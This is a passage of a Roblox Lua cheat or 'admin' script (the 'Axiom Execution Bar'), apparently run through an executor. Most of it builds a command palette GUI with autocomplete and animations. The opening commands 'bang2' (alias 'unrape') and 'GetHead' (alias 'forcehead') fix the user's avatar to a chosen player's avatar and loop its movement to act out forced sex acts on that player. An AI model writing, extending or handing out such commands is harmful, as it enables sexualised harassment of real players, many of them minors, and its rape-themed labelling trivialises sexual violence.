					for i = 1, 3, 0.25 do
						glue(target, true)
						getChar().HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
						getChar().HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
						getChar().HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame* CFrame.new(0, 0, i)
						task.wait()
						alivecheck1 = chechifalive(targetChar)
						alivecheck2 = chechifalive(getChar())
					end
					for i = 3, 1, -0.25 do
						glue(target, true)
						getChar().HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
						getChar().HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
						getChar().HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame* CFrame.new(0, 0, i)
						task.wait()
						alivecheck1 = chechifalive(targetChar)
						alivecheck2 = chechifalive(getChar())
					end
				until alivecheck1 == false or alivecheck2 == false or bang2 == false
				glue(target, false)
				hum.PlatformStand = false
			end
		},
		{
			Name = "UnBang2",
			Aliases = {"unbang2", "unrape"},
			Description = "Stops bang2.",
			Usage = "unbang2",
			Arguments = {},
			Run = function(args)
				bang2 = false
			end
		},
		{
			Name = "GetHead",
			Aliases = {"gethead", "forcehead"},
			Description = "Makes a player give you head.",
			Usage = "gethead <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				if #targets == 0 then return end
				local hum = getChar().Humanoid
				local target = targets[1]
				local targetChar = target.Character
				if bang2 == true then 
					bang2 = false
				end
				task.wait()
				bang2 = true
				hum.PlatformStand = true
				local alivecheck1 = true
				local alivecheck2 = true
				repeat
					for i = -1.5, -3, -0.25 do
						glue(target, true)
						getChar().HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
						getChar().HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
						getChar().HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame* CFrame.new(0, 3, i)* CFrame.Angles(0, math.rad(180), 0)
						task.wait()
						alivecheck1 = chechifalive(targetChar)
						alivecheck2 = chechifalive(getChar())
					end
					for i = -3, -1.5, 0.25 do
						glue(target, true)
						getChar().HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
						getChar().HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
						getChar().HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame* CFrame.new(0, 3, i)* CFrame.Angles(0, math.rad(180), 0)
						task.wait()
						alivecheck1 = chechifalive(targetChar)
						alivecheck2 = chechifalive(getChar())
					end
				until alivecheck1 == false or alivecheck2 == false or bang2 == false
				glue(target, false)
				hum.PlatformStand = false
			end
		},
		{
			Name = "UnGetHead",
			Aliases = {"ungethead", "unforcehead"},
			Description = "Stops GetHead.",
			Usage = "ungethead",
			Arguments = {},
			Run = function(args)
				bang2 = false
			end
		},
		{
			Name = "Commands",
			Aliases = {"commands", "cmds"},
			Description = "Shows a gui with all the commands.",
			Usage = "commands",
			Arguments = {},
			Run = function(args)
				 loadcmdsgui()
			end
		},
		{
			Name = "Ping",
			Aliases = {"ping"},
			Description = "Gets your ping and tells you",
			Usage = "ping",
			Arguments = {},
			Run = function(args)
				notice("Current Ping: "..tostring(globalLib.fetchping()).."ms")
			end
		},
		{
			Name = "placeholder",
			Aliases = {"placeholder"},
			Description = "placeholder",
			Usage = "placeholder",
			Arguments = {},
			Run = function(args)
				notice("This does nothing its just here for me to make more commands")
			end
		},
		{
			Name = "StopAdmin",
			Aliases = {"stopadmin", "exit"},
			Description = "Stops the admin and deletes itself.",
			Usage = "stopadmin",
			Arguments = {},
			Run = function(args)
				if adminConnections.keyconnectcheck then
					adminConnections.keyconnectcheck:Disconnect()
					adminConnections.keyconnectcheck = nil
				end
				if adminConnections.plrjoinconnect then
					adminConnections.plrjoinconnect:Disconnect()
					adminConnections.plrjoinconnect = nil
				end
				if adminConnections.textchatconnect then
					adminConnections.textchatconnect = false
				end
				script.Parent:Destroy()
				notice("Axiom Execution Line Has Fully Unloaded.")
			end
		}
	}
	
	local TweenService = game:GetService("TweenService")
	local CommandLabels = {}
	local CommandFrames = {}
	local CommandsGUI = script.Parent:WaitForChild("CMDLINE"):WaitForChild("Background"):WaitForChild("Commands")
	local SUGGESTION_FADE_INFO = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	print("-- COMMANDS --")
	for _, Command in ipairs(Commands) do
		local Frame = Instance.new("Frame")
		Frame.Size = UDim2.new(1, 0, 0, 40)
		Frame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
		Frame.BackgroundTransparency = 1
		Frame.Visible = false
		Frame.Name = Command.Name

		local Label = Instance.new("TextLabel")
		Label.Name = Command.Name
		Label.Size = UDim2.new(1, 0, 1, 0)
		Label.Position = UDim2.new(0, 10, 0, 0)
		Label.BackgroundTransparency = 1
		Label.TextTransparency = 1 
		Label.TextXAlignment = Enum.TextXAlignment.Left
		Label.TextColor3 = Color3.fromRGB(255, 255, 255)
		Label.Font = Enum.Font.Code
		Label.TextSize = 17
		Label.Text = Command.Usage .. " | " .. Command.Description

		local cmdUICorner = UICorner:Clone()
		cmdUICorner.Parent = Frame

		Label.Parent = Frame
		Frame.Parent = CommandsGUI

		CommandLabels[Command] = Label
		CommandFrames[Command] = {
			Frame = Frame,
			Shown = false, 
		}
		print(Command.Usage .. " | " .. Command.Description)
	end
	local CommandLookup = {}

	for _, cmd in ipairs(Commands) do
		for _, alias in ipairs(cmd.Aliases) do
			CommandLookup[alias:lower()] = cmd
		end
	end
	local CommandBar = script.Parent:WaitForChild("CMDLINE"):WaitForChild("Background")
	local FocusBar = CommandBar:WaitForChild("Input")
	local GhostLabel = Instance.new("TextLabel")
	GhostLabel.Name = "Ghost"
	GhostLabel.Parent = FocusBar.Parent
	GhostLabel.AnchorPoint = FocusBar.AnchorPoint
	GhostLabel.Position = FocusBar.Position- UDim2.new(0, 0, 0, 3)
	GhostLabel.Size = FocusBar.Size
	GhostLabel.BackgroundTransparency = 1
	GhostLabel.Font = FocusBar.Font
	GhostLabel.TextSize = FocusBar.TextSize
	GhostLabel.TextXAlignment = FocusBar.TextXAlignment
	GhostLabel.TextYAlignment = FocusBar.TextYAlignment
	GhostLabel.RichText = true
	GhostLabel.Text = ""
	local AdminTitle = Instance.new("TextLabel")
	AdminTitle.Name = "AdminTitle"
	AdminTitle.Parent = Background
	AdminTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	AdminTitle.BackgroundTransparency = 1.000
	AdminTitle.BorderColor3 = Color3.fromRGB(0, 0, 0)
	AdminTitle.BorderSizePixel = 0
	AdminTitle.Size = UDim2.new(1, 0, 0, 10)
	AdminTitle.Font = Enum.Font.Code
	AdminTitle.Text = "Axiom Execution Bar [CL_D Reborn]"
	AdminTitle.Visible = false
	AdminTitle.TextXAlignment = Enum.TextXAlignment.Left
	AdminTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	AdminTitle.TextSize = 17.000
	local AdminTitleUIS = Instance.new("UIStroke")
	AdminTitleUIS.Parent = AdminTitle
	AdminTitleUIS.Color = Color3.fromRGB(0, 0, 0)
	AdminTitleUIS.Thickness = 2
	AdminTitleUIS.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual

	function loadcmdsgui()
		if plr:FindFirstChild("PlayerGui"):FindFirstChild("AxiomCommands") then
			plr:FindFirstChild("PlayerGui"):FindFirstChild("AxiomCommands"):Destroy()
		end
		local AxiomCommands = Instance.new("ScreenGui")
		local Backgrounds = Instance.new("Frame")
		local backguis = Instance.new("UIStroke")
		local Top = Instance.new("Frame")
		local Close_X = Instance.new("TextButton")
		local Middle = Instance.new("Frame")
		local CMDSTitle = Instance.new("TextLabel")
		local Home = Instance.new("TextButton")
		local UnderHome = Instance.new("Frame")
		local Settings = Instance.new("TextButton")
		local UnderSettings = Instance.new("Frame")
		local CommandsPage = Instance.new("Frame")
		local cmdsscroll = Instance.new("ScrollingFrame")
		local UIGridLayout = Instance.new("UIGridLayout")
		local SettingsPage = Instance.new("Frame")
		local ScrollingFrame = Instance.new("ScrollingFrame")

		AxiomCommands.Name = "AxiomCommands"
		AxiomCommands.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		AxiomCommands.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		AxiomCommands.ResetOnSpawn = false

		Backgrounds.Name = "Background"
		Backgrounds.Parent = AxiomCommands
		Backgrounds.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
		Backgrounds.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Backgrounds.BorderSizePixel = 0
		Backgrounds.Position = UDim2.new(0.263819098, 0, 0.274151444, 0)
		Backgrounds.Size = UDim2.new(0, 450, 0, 275)

		local TweenService = game:GetService("TweenService")

		Backgrounds.AnchorPoint = Vector2.new(0.5, 0.5)

		local finalPos = UDim2.new(0.5, 0, 0.5, 0)
		local finalSize = UDim2.new(0, 450, 0, 275)

		Backgrounds.Position = finalPos
		Backgrounds.Size = UDim2.new(0, 350, 0, 215)
		Backgrounds.BackgroundTransparency = 1

		for _, obj in ipairs(Backgrounds:GetDescendants()) do
			if obj:IsA("TextLabel") or obj:IsA("TextButton") then
				obj.TextTransparency = 1
			elseif obj:IsA("Frame") then
				obj.BackgroundTransparency = 1
			elseif obj:IsA("UIStroke") then
				obj.Transparency = 1
			end
		end

		local openTween = TweenService:Create(
			Backgrounds,
			TweenInfo.new(
				0.8,
				Enum.EasingStyle.Quint,
				Enum.EasingDirection.Out
			),
			{
				Size = finalSize,
				BackgroundTransparency = 0
			}
		)

		openTween:Play()
		firesound(135595810064855)

		for _, obj in ipairs(Backgrounds:GetDescendants()) do
			if obj:IsA("TextLabel") or obj:IsA("TextButton") then
				TweenService:Create(
					obj,
					TweenInfo.new(0.4),
					{TextTransparency = 0}
				):Play()
			elseif obj:IsA("Frame") then
				TweenService:Create(
					obj,
					TweenInfo.new(0.4),
					{BackgroundTransparency = 0}
				):Play()
			elseif obj:IsA("UIStroke") then
				TweenService:Create(
					obj,
					TweenInfo.new(0.4),
					{Transparency = 0}
				):Play()
			end
		end

		backguis.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		backguis.Color = Color3.fromRGB(255, 255, 255)
		backguis.LineJoinMode = Enum.LineJoinMode.Round
		backguis.StrokeSizingMode = Enum.StrokeSizingMode.FixedSize
		backguis.Thickness = 3
		backguis.Parent = Backgrounds

		local backguishue = 0
		local backguisrainbowconnection

		backguisrainbowconnection = RunServicess.RenderStepped:Connect(function(dt)
			if Backgrounds == nil then 
				backguisrainbowconnection:Disconnect()
				backguisrainbowconnection = nil
				return 
			end
			if Backgrounds.Visible then
				backguishue = (backguishue + dt * 0.25) % 1 
				backguis.Color = Color3.fromHSV(backguishue, 1, 1)
			end
		end)

		Top.Name = "Top"
		Top.Parent = Backgrounds
		Top.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		Top.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Top.BorderSizePixel = 0
		Top.Size = UDim2.new(1, 0, 0, 20)

		Close_X.Name = "Close_X"
		Close_X.Parent = Top
		Close_X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Close_X.BackgroundTransparency = 1.000
		Close_X.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Close_X.BorderSizePixel = 0
		Close_X.Position = UDim2.new(0.951111138, 0, 0, 0)
		Close_X.Size = UDim2.new(0, 20, 0, 20)
		Close_X.Font = Enum.Font.Cartoon
		Close_X.Text = "X"
		Close_X.TextColor3 = Color3.fromRGB(255, 255, 255)
		Close_X.TextSize = 14.000

		Middle.Name = "Middle"
		Middle.Parent = Backgrounds
		Middle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Middle.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Middle.BorderSizePixel = 0
		Middle.Position = UDim2.new(0, 0, 0.0799999982, 0)
		Middle.Size = UDim2.new(1, 0, 0, 55)

		CMDSTitle.Name = "CMDSTitle"
		CMDSTitle.Parent = Middle
		CMDSTitle.AnchorPoint = Vector2.new(0.5, 0)
		CMDSTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CMDSTitle.BackgroundTransparency = 1.000
		CMDSTitle.BorderColor3 = Color3.fromRGB(27, 42, 53)
		CMDSTitle.Position = UDim2.new(0, 110, 0, 5)
		CMDSTitle.Size = UDim2.new(0, 203, 0, 18)
		CMDSTitle.ZIndex = 2
		CMDSTitle.Font = Enum.Font.SourceSansBold
		CMDSTitle.Text = "AXIOM COMMANDS"
		CMDSTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
		CMDSTitle.TextSize = 24.000
		CMDSTitle.TextWrapped = true
		CMDSTitle.TextXAlignment = Enum.TextXAlignment.Left

		Home.Name = "Home"
		Home.Parent = Middle
		Home.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Home.BackgroundTransparency = 1.000
		Home.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Home.BorderSizePixel = 0
		Home.Position = UDim2.new(0.0177777782, 0, 0.411188841, 0)
		Home.Size = UDim2.new(0, 100, 0, 30)
		Home.Font = Enum.Font.SourceSans
		Home.Text = "HOME"
		Home.TextColor3 = Color3.fromRGB(255, 255, 255)
		Home.TextSize = 17.000

		UnderHome.Name = "UnderHome"
		UnderHome.Parent = Home
		UnderHome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		UnderHome.BorderColor3 = Color3.fromRGB(0, 0, 0)
		UnderHome.BorderSizePixel = 0
		UnderHome.Position = UDim2.new(0, 0, 1, 0)
		UnderHome.Size = UDim2.new(1, 0, 0, 2)

		Settings.Name = "Settings"
		Settings.Parent = Middle
		Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Settings.BackgroundTransparency = 1.000
		Settings.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Settings.BorderSizePixel = 0
		Settings.Position = UDim2.new(0.239999995, 0, 0.411188841, 0)
		Settings.Size = UDim2.new(0, 100, 0, 30)
		Settings.Visible = true
		Settings.Font = Enum.Font.SourceSans
		Settings.Text = "SETTINGS"
		Settings.TextColor3 = Color3.fromRGB(255, 255, 255)
		Settings.TextSize = 17.000

		UnderSettings.Name = "UnderSettings"
		UnderSettings.Parent = Settings
		UnderSettings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		UnderSettings.BorderColor3 = Color3.fromRGB(0, 0, 0)
		UnderSettings.BorderSizePixel = 0
		UnderSettings.Visible = false
		UnderSettings.Position = UDim2.new(0, 0, 1, 0)
		UnderSettings.Size = UDim2.new(1, 0, 0, 2)
		UnderSettings.Visible = false

		CommandsPage.Name = "CommandsPage"
		CommandsPage.Parent = Backgrounds
		CommandsPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		CommandsPage.BackgroundTransparency = 1.000
		CommandsPage.BorderColor3 = Color3.fromRGB(0, 0, 0)
		CommandsPage.BorderSizePixel = 0
		CommandsPage.Position = UDim2.new(0, 0, 0.280000001, 0)
		CommandsPage.Size = UDim2.new(1, 0, 0, 198)

		cmdsscroll.Name = "cmdsscroll"
		cmdsscroll.Parent = CommandsPage
		cmdsscroll.Active = true
		cmdsscroll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		cmdsscroll.BackgroundTransparency = 1.000
		cmdsscroll.BorderColor3 = Color3.fromRGB(0, 0, 0)
		cmdsscroll.BorderSizePixel = 0
		cmdsscroll.Size = UDim2.new(1, 0, 1, 0)
		cmdsscroll.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		cmdsscroll.ScrollBarThickness = 5
		cmdsscroll.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"

		UIGridLayout.Parent = cmdsscroll
		UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		UIGridLayout.CellSize = UDim2.new(0.949999988, 0, 0, 100)

		SettingsPage.Name = "SettingsPage"
		SettingsPage.Parent = Backgrounds
		SettingsPage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		SettingsPage.BorderColor3 = Color3.fromRGB(0, 0, 0)
		SettingsPage.BorderSizePixel = 0
		SettingsPage.BackgroundTransparency = 1
		SettingsPage.Position = UDim2.new(0, 0, 0.280000001, 0)
		SettingsPage.Size = UDim2.new(1, 0, 0, 198)
		SettingsPage.Visible = false

		ScrollingFrame.Parent = SettingsPage
		ScrollingFrame.Active = true
		ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ScrollingFrame.BackgroundTransparency = 1.000
		ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ScrollingFrame.BorderSizePixel = 0
		ScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
		ScrollingFrame.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
		ScrollingFrame.ScrollBarThickness = 5
		ScrollingFrame.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"

		local layout = UIGridLayout
		local scroll = cmdsscroll

		local function updateCanvas()
			scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
		end

		layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)

		Home.MouseButton1Click:Connect(function()
			UnderHome.Visible = true
			CommandsPage.Visible = true

			UnderSettings.Visible = false
			SettingsPage.Visible = false
		end)
		Settings.MouseButton1Click:Connect(function()
			UnderHome.Visible = false
			CommandsPage.Visible = false

			UnderSettings.Visible = true
			SettingsPage.Visible = true
		end)
				

		local function QGWHI_fake_script() 
			local script = Instance.new('LocalScript', AxiomCommands)

			local frame = script.Parent.Background
			local userInput = game:GetService("UserInputService")
					
			local dragging = false
			local dragStart
			local startPos
					
			frame.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					dragging = true
					dragStart = input.Position
					startPos = frame.Position
				end
			end)
					
			frame.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					dragging = false
				end
			end)
					
			userInput.InputChanged:Connect(function(input)
				if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
					local delta = input.Position - dragStart
					frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				end
			end)
					
			script.Parent:WaitForChild("Background"):WaitForChild("Top"):WaitForChild("Close_X").MouseButton1Down:Connect(function()
				script.Parent:Destroy()
			end)

			for _, Command in ipairs(Commands) do
				local CMDHOLDERs = Instance.new("Frame")
				local CMDNAMEs = Instance.new("TextLabel")
				local usage = Instance.new("TextLabel")
				local descriptions = Instance.new("TextLabel")
				local aliases = Instance.new("TextLabel")
				local cmdusage = Instance.new("TextLabel")
				local cmddesc = Instance.new("TextLabel")
				local cmdali = Instance.new("TextLabel")

				CMDHOLDERs.Name = Command.Name
				CMDHOLDERs.Parent = cmdsscroll
				CMDHOLDERs.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
				CMDHOLDERs.BorderColor3 = Color3.fromRGB(0, 0, 0)
				CMDHOLDERs.BorderSizePixel = 0
				CMDHOLDERs.Size = UDim2.new(0, 100, 0, 100)

				CMDHOLDERs.BackgroundTransparency = 1

				CMDHOLDERs.Position = UDim2.new(0, 0, 0, 15)

				TweenService:Create(
					CMDHOLDERs,
					TweenInfo.new(
						0.5,
						Enum.EasingStyle.Quint,
						Enum.EasingDirection.Out
					),
					{
						BackgroundTransparency = 0,
						Position = CMDHOLDERs.Position - UDim2.new(0,0,0,15)
					}
				):Play()

				CMDNAMEs.Name = "CMDNAME"
				CMDNAMEs.Parent = CMDHOLDERs
				CMDNAMEs.AnchorPoint = Vector2.new(0.5, 0)
				CMDNAMEs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				CMDNAMEs.BackgroundTransparency = 1.000
				CMDNAMEs.BorderColor3 = Color3.fromRGB(0, 0, 0)
				CMDNAMEs.BorderSizePixel = 0
				CMDNAMEs.Position = UDim2.new(0.5, 0, 0, 0)
				CMDNAMEs.Size = UDim2.new(0, 200, 0, 25)
				CMDNAMEs.Font = Enum.Font.SourceSansBold
				CMDNAMEs.Text = Command.Name
				CMDNAMEs.TextColor3 = Color3.fromRGB(255, 255, 255)
				CMDNAMEs.TextSize = 20.000

				usage.Name = "usage"
				usage.Parent = CMDHOLDERs
				usage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				usage.BackgroundTransparency = 1.000
				usage.BorderColor3 = Color3.fromRGB(0, 0, 0)
				usage.BorderSizePixel = 0
				usage.Position = UDim2.new(0.0210526325, 0, 0.25, 0)
				usage.Size = UDim2.new(0, 50, 0, 20)
				usage.Font = Enum.Font.SourceSansBold
				usage.Text = "Usage:"
				usage.TextColor3 = Color3.fromRGB(255, 255, 255)
				usage.TextSize = 16.000
				usage.TextXAlignment = Enum.TextXAlignment.Left

				descriptions.Name = "descriptions"
				descriptions.Parent = CMDHOLDERs
				descriptions.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				descriptions.BackgroundTransparency = 1.000
				descriptions.BorderColor3 = Color3.fromRGB(0, 0, 0)
				descriptions.BorderSizePixel = 0
				descriptions.Position = UDim2.new(0.0210526325, 0, 0.449999988, 0)
				descriptions.Size = UDim2.new(0, 75, 0, 20)
				descriptions.Font = Enum.Font.SourceSansBold
				descriptions.Text = "Description:"
				descriptions.TextColor3 = Color3.fromRGB(255, 255, 255)
				descriptions.TextSize = 16.000
				descriptions.TextXAlignment = Enum.TextXAlignment.Left

				aliases.Name = "aliases"
				aliases.Parent = CMDHOLDERs
				aliases.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				aliases.BackgroundTransparency = 1.000
				aliases.BorderColor3 = Color3.fromRGB(0, 0, 0)
				aliases.BorderSizePixel = 0
				aliases.Position = UDim2.new(0.0210526325, 0, 0.649999976, 0)
				aliases.Size = UDim2.new(0, 50, 0, 20)
				aliases.Font = Enum.Font.SourceSansBold
				aliases.Text = "Aliases:"
				aliases.TextColor3 = Color3.fromRGB(255, 255, 255)
				aliases.TextSize = 16.000
				aliases.TextXAlignment = Enum.TextXAlignment.Left

				cmdusage.Name = "cmdusage"
				cmdusage.Parent = CMDHOLDERs
				cmdusage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				cmdusage.BackgroundTransparency = 1.000
				cmdusage.BorderColor3 = Color3.fromRGB(0, 0, 0)
				cmdusage.BorderSizePixel = 0
				cmdusage.Position = UDim2.new(0.121637426, 0, 0.25, 0)
				cmdusage.Size = UDim2.new(0.876023412, 0, 0, 20)
				cmdusage.Font = Enum.Font.SourceSans
				cmdusage.Text = Command.Usage
				cmdusage.TextColor3 = Color3.fromRGB(255, 255, 255)
				cmdusage.TextSize = 16.000
				cmdusage.TextXAlignment = Enum.TextXAlignment.Left

				cmddesc.Name = "cmddesc"
				cmddesc.Parent = CMDHOLDERs
				cmddesc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				cmddesc.BackgroundTransparency = 1.000
				cmddesc.BorderColor3 = Color3.fromRGB(0, 0, 0)
				cmddesc.BorderSizePixel = 0
				cmddesc.Position = UDim2.new(0.196491227, 0, 0.449999988, 0)
				cmddesc.Size = UDim2.new(0, 343, 0, 20)
				cmddesc.Font = Enum.Font.SourceSans
				cmddesc.Text = Command.Description
				cmddesc.TextColor3 = Color3.fromRGB(255, 255, 255)
				cmddesc.TextSize = 16.000
				cmddesc.TextXAlignment = Enum.TextXAlignment.Left

				cmdali.Name = "cmdali"
				cmdali.Parent = CMDHOLDERs
				cmdali.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				cmdali.BackgroundTransparency = 1.000
				cmdali.BorderColor3 = Color3.fromRGB(0, 0, 0)
				cmdali.BorderSizePixel = 0
				cmdali.Position = UDim2.new(0.13567251, 0, 0.649999976, 0)
				cmdali.Size = UDim2.new(0, 369, 0, 20)
				cmdali.Font = Enum.Font.SourceSans
				local aliases = Command.Aliases
				if aliases and #aliases > 0 then
					cmdali.Text = table.concat(aliases, ", ")
				else
					cmdali.Text = "None"
				end
				cmdali.TextColor3 = Color3.fromRGB(255, 255, 255)
				cmdali.TextSize = 16.000
				cmdali.TextXAlignment = Enum.TextXAlignment.Left
				task.wait(0.01)
			end
			updateCanvas()
		end
		coroutine.wrap(QGWHI_fake_script)()
	end


	local function fadeIn(frame, label)
		frame.Visible = true
		frame.BackgroundTransparency = 1
		label.TextTransparency = 0

		TweenService:Create(frame, SUGGESTION_FADE_INFO, {BackgroundTransparency = 0}):Play()
	end

	local function fadeOut(frame, label)
		local bgTween = TweenService:Create(frame, SUGGESTION_FADE_INFO, {BackgroundTransparency = 1})

		bgTween:Play()

		bgTween.Completed:Connect(function(playbackState)
			if playbackState == Enum.PlaybackState.Completed then
				frame.Visible = false
			end
		end)
	end

	local function UpdateSuggestions()
		local Text = FocusBar.Text:lower()

		if Text == "" then
			for Command, data in pairs(CommandFrames) do
				if data.Shown then
					data.Shown = false
					fadeOut(data.Frame, CommandLabels[Command])
				end
			end
			return
		end

		for Command, Label in pairs(CommandLabels) do
			local data = CommandFrames[Command]
			local Match = false

			if Command.Name:lower():sub(1, #Text) == Text then
				Match = true
			end
			if string.find(Command.Name:lower(), Text, 1, true) then
				Match = true
			end

			if not Match then
				for _, Alias in ipairs(Command.Aliases) do
					if Alias:lower():sub(1, #Text) == Text then
						Match = true
						break
					end
				end
			end

			if Match and not data.Shown then
				data.Shown = true
				fadeIn(data.Frame, Label)
			elseif not Match and data.Shown then
				data.Shown = false
				fadeOut(data.Frame, Label)
			end
		end
	end
	local function escapeRichText(str)
		str = str:gsub("&", "&amp;")
		str = str:gsub("<", "&lt;")
		str = str:gsub(">", "&gt;")
		str = str:gsub("\"", "&quot;")
		return str
	end

	local function findFirstPlayerSuggestion(text)
		if text == "" then return nil end
		local lowerText = text:lower()

		local keywords = {"me", "self", "all", "everyone", "others", "random"}
		for _, keyword in ipairs(keywords) do
			if keyword:sub(1, #lowerText) == lowerText then
				return keyword
			end
		end

		for _, v in ipairs(players:GetPlayers()) do
			if v.Name:lower():sub(1, #lowerText) == lowerText then
				return v.Name
			end
			if v.DisplayName:lower():sub(1, #lowerText) == lowerText then
				return v.DisplayName
			end
		end

		return nil
	end

	local function findFirstSuggestionCmd(text)
		for _, cmd in ipairs(Commands) do
			local nameLower = cmd.Name:lower()
			if nameLower:sub(1, #text) == text then
				return cmd, cmd.Name
			end
			for _, alias in ipairs(cmd.Aliases) do
				local aliasLower = alias:lower()
				if aliasLower:sub(1, #text) == text then
					return cmd, alias
				end
			end
		end
		return nil, nil
	end

	local function UpdateGhostText()
		local Text = FocusBar.Text

		if Text == "" then
			GhostLabel.Text = ""
			return
		end

		local typedColorHex = "#" .. Background.BackgroundColor3:ToHex()
		local parts = Text:split(" ")
		local firstWord = parts[1]
		local lowerFirst = firstWord:lower()

		if #parts == 1 then
			local cmd, suggestion = findFirstSuggestionCmd(lowerFirst)

			if not suggestion or #suggestion <= #firstWord then
				GhostLabel.Text = ""
				return
			end

			local completion = suggestion:sub(#firstWord + 1)

			GhostLabel.Text = string.format(
				'<font color="%s">%s</font><font color="#888888">%s</font>',
				typedColorHex,
				escapeRichText(Text),
				escapeRichText(completion)
			)
			return
		end

		local cmd, _ = findFirstSuggestionCmd(lowerFirst)

		if not cmd or not cmd.Arguments or cmd.Arguments[1] ~= "player" then
			GhostLabel.Text = ""
			return
		end

		local playerQuery = parts[2] or ""

		local playerSuggestion = findFirstPlayerSuggestion(playerQuery)

		if not playerSuggestion or #playerSuggestion <= #playerQuery then
			GhostLabel.Text = string.format(
				'<font color="%s">%s</font>',
				typedColorHex,
				escapeRichText(Text)
			)
			return
		end

		local playerCompletion = playerSuggestion:sub(#playerQuery + 1)

		GhostLabel.Text = string.format(
			'<font color="%s">%s</font><font color="#888888">%s</font>',
			typedColorHex,
			escapeRichText(Text),
			escapeRichText(playerCompletion)
		)
	end

	local function sendCMD(msg)
		local split = msg:split(" ")
		local cmdName = split[1]:lower()

		table.remove(split, 1)
		local args = split

		local command = CommandLookup[cmdName]
		if not command then
			notice("Unknown command:", cmdName)
			return
		end

		command.Run(args)
	end

	Background.BackgroundTransparency = 1
	Background.Position = UDim2.new(0.5, 0, 2, 0)
	Background.Visible = false

	TopLine.Size = UDim2.new(0, 0, 0, 3)
	TopLine.Position = UDim2.new(0.5, 0, 1, 0)

	local BG_TWEEN_INFO = TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
	local TOPLINE_OPEN_INFO = TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local TOPLINE_CLOSE_INFO = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
	local BG_CLOSE_INFO = TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.In)

	local animationToken = 0 

	local function playTween(obj, info, goal)
		local tween = TweenService:Create(obj, info, goal)
		tween:Play()
		return tween
	end

	local function openCmdBar()
		animationToken += 1
		local myToken = animationToken

		Background.Visible = true

		Background.Position = UDim2.new(0.5, 0, 2, 0)
		Background.BackgroundTransparency = 1
		TopLine.Size = UDim2.new(0, 0, 0, 3)
		TopLine.Position = UDim2.new(0.5, 0, 1, 0)

		task.spawn(function()
			game:GetService("RunService").PreRender:Wait()

			if animationToken ~= myToken then return end

			local bgTween = playTween(Background, BG_TWEEN_INFO, {
				Position = UDim2.new(0.5, 0, 0.899999976, 0),
				BackgroundTransparency = 0,
			})

			task.wait(BG_TWEEN_INFO.Time)
			AdminTitle.Position = UDim2.new(0, 0, 1, 10)
			AdminTitle.Visible = true
			if animationToken ~= myToken then return end

			playTween(TopLine, TOPLINE_OPEN_INFO, {
				Size = UDim2.new(1, 0, 0, 3),
				Position = UDim2.new(0, 0, 1, 0),
			})
		end)
	end

